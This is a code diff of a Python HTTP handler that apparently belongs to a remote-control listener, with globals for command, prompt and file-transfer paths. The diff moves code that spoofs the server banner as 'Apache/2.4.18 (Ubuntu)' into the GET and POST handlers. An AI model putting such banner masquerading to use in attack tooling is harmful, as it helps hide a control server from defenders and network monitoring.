@@ -31,8 +31,6 @@ banner2 = """
 class MyServer(BaseHTTPRequestHandler):
     def _set_headers(self, code=200):
         self.send_response(code)
-        self.server_version = "Apache/2.4.18"
-        self.sys_version = "(Ubuntu)"
         self.send_header("Content-type", "text/plain")
         self.end_headers()
 
@@ -77,6 +75,8 @@ class MyServer(BaseHTTPRequestHandler):
     def do_GET(self):
         global prompt ; global first_run ; global noerror
         global local_path ; global remote_path ; global command
+        self.server_version = "Apache/2.4.18"
+        self.sys_version = "(Ubuntu)"
         try:
             if self.path == "/api/download":
                 with open(local_path, "rb") as file:
@@ -186,6 +186,8 @@ class MyServer(BaseHTTPRequestHandler):
     def do_POST(self):
         global prompt ; global first_run ; global noerror
         global local_path ; global remote_path ; global command
+        self.server_version = "Apache/2.4.18"
+        self.sys_version = "(Ubuntu)"
         try:
             self._set_headers() ; response = "Success"
             content_length = int(self.headers["Content-Length"])
